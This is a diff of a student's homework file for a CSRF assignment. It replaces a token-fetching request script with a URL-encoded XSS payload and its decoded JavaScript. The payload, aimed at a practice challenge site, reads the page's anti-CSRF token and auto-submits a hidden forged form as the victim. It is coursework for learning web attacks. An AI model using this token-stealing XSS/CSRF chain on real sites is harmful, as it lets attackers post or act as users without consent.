@@ -1,43 +1,46 @@
-<!DOCTYPE html>
-<html lang="en">
-<html>
-<head>
-	<meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="Template for doing info415 homework w/ Andrew M.">
-    <meta name="author" content="Royce Le">
-	<title>HW4 - CSRF</title>
-<!-- 	<script src=code.jquery etc.> </script> -->
-</head>
-<body>
-	<script> 
-	  function request(url, type, callback, send){
-	      var oReq = new XMLHttpRequest();
-	      oReq.open(type, url, true);
-	      oReq.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-	      oReq.onload = callback;
-	      oReq.send(send);
-	  };
-	  function getListener () {
-	      var el = document.createElement('div');
-	      el.innerHTML = this.responseText; 
-	      request('http://csrf-challenges.r7.io/make_post/4', 'POST', postListener, 'csrf=' + el.querySelector('input[name="csrf"]').value + '&post=royle');
-	  };
-	  function postListener(){
-	      console.log(this.responseText)
-	  };
-	  request('http://csrf-challenges.r7.io/make_post/4', 'GET', getListener);
-	</script>
-	<!---
-	<form id="post_form" action="http://csrf-challenges.r7.io/make_post/4" method="POST" >
-		<textarea name="post" value="royle">royle</textarea>
-		<input type="submit" value="submit">
-	</form>
-	<script type="text/javascript">
-		document.getElementById("post_form").submit();
-	</script>
--->
-</body>
-</html>
+Link: 
+
+http://csrf-challenges.r7.io/xss?cc=%3Cbody%3E%3C/body%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%22http://csrf-challenges.r7.io/make_post/4%22,%20false);xhr.send();parser%20=%20new%20DOMParser();var%20doc%20=%20parser.parseFromString(xhr.responseText,%20%22text/html%22);var%20token%20=%20doc.getElementsByName(%22csrf%22)[0].value;var%20frame%20=%20document.createElement(%22iframe%22);frame.setAttribute(%22name%22,%20%22hiddenFrame%22);frame.setAttribute(%22style%22,%20%22display:none%22);document.body.appendChild(frame);var%20form%20=%20document.createElement(%22form%22);form.setAttribute(%22name%22,%20%22post_form%22);form.setAttribute(%22action%22,%20%22http://csrf-challenges.r7.io/make_post/4%22);form.setAttribute(%22method%22,%20%22POST%22);form.setAttribute(%22target%22,%20%22hiddenFrame%22);var%20hiddenField%20=%20document.createElement(%22input%22);hiddenField.setAttribute(%22type%22,%20%22hidden%22);hiddenField.setAttribute(%22name%22,%20%22csrf%22);hiddenField.setAttribute(%22value%22,%20token);var%20textareaa%20=%20document.createElement(%22input%22);textareaa.setAttribute(%22name%22,%20%22post%22);textareaa.setAttribute(%22value%22,%20%22royle%22);textareaa.setAttribute(%22style%22,%20%22display:none%22);form.appendChild(hiddenField);form.appendChild(textareaa);document.body.appendChild(form);post_form.submit();%3C/script%3E
+
+---------------------
+<body></body>
+<script>
+	var xhr = new XMLHttpRequest();
+	xhr.open('GET', "http://csrf-challenges.r7.io/make_post/4", false);
+	xhr.send();
+
+	parser = new DOMParser();
+	var doc = parser.parseFromString(xhr.responseText, "text/html");
+	var token = doc.getElementsByName("csrf")[0].value;
+
+	var frame = document.createElement("iframe");
+	frame.setAttribute("name", "hiddenFrame");
+	frame.setAttribute("style", "display:none");
+	document.body.appendChild(frame);
+
+	var form = document.createElement("form");
+	form.setAttribute("name", "post_form");
+	form.setAttribute("action", "http://csrf-challenges.r7.io/make_post/4");
+	form.setAttribute("method", "POST");
+	form.setAttribute("target", "hiddenFrame");
+
+	var hiddenField = document.createElement("input");
+	hiddenField.setAttribute("type", "hidden");
+	hiddenField.setAttribute("name", "csrf");
+	hiddenField.setAttribute("value", token);
+
+	var textareaa = document.createElement("input");
+	textareaa.setAttribute("name", "post");
+	textareaa.setAttribute("value", "royle");
+	textareaa.setAttribute("style", "display:none");
+
+
+	form.appendChild(hiddenField);
+	form.appendChild(textareaa);
+	document.body.appendChild(form);
+
+	post_form.submit();
+
+</script>
+
 
